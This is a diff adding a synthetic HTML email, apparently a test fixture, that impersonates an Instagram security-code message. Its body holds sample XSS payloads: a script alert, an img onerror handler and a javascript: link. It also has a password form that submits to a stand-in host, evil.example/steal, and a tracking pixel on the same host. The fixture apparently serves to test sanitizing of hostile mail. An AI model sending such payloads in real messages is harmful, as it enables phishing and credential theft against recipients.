@@ -1,0 +1,12 @@
+From: "Instagram" <no-reply@instagram-security.example>
+To: alguem@inboxnexo.online
+Subject: Security code
+Message-ID: <sintetico-3@instagram-security.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><head><script>alert("xss")</script><style>body{}</style></head>
+<body><p>Your security code is <b>778899</b></p>
+<form action="https://evil.example/steal"><input name="senha"></form>
+<img src="https://evil.example/pixel.gif" onerror="alert(1)">
+<a href="javascript:alert(2)">Confirmar</a></body></html>
